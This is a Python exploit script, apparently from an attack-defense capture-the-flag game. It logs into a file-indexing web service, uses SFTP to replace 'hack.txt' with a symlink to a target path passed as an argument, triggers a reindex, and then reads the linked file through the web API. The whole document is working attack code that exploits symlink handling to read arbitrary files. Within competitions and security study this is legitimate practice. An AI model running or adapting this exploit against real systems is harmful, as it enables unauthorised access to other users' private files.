import sys

import paramiko
import requests

IP = sys.argv[1]
HINT = sys.argv[2]

URL = 'http://{}:8080'.format(IP)


def register(username: str, password: str):
    sess = requests.Session()
    resp = sess.post(URL + '/register', json={'username': username, 'password': password})
    assert resp.status_code == 200
    return sess


def login(username: str, password: str):
    sess = requests.Session()
    resp = sess.post(URL + '/login', json={'username': username, 'password': password})
    assert resp.status_code == 200
    return sess


def reindex(sess):
    resp = sess.post(URL + '/reindex')
    assert resp.status_code == 200


def read_hack_file(sess):
    resp = sess.get(URL + '/files')
    for x in resp.json():
        if 'hack.txt' in x['path']:
            resp = sess.get(URL + '/file', params={'path': x['path'], 'token': x['token']})
            print(resp.text, flush=True)
            break


u = 'randomusername'
p = 'randompassword'
# s = register(u, p)
s = login(u, p)

cli = paramiko.SSHClient()
cli.set_missing_host_key_policy(paramiko.AutoAddPolicy())
cli.connect(IP, port=4222, username=u, password=p)
sftp_cli = cli.open_sftp()

sftp_cli.remove('hack.txt')
sftp_cli.symlink(HINT, 'hack.txt')

reindex(s)
read_hack_file(s)
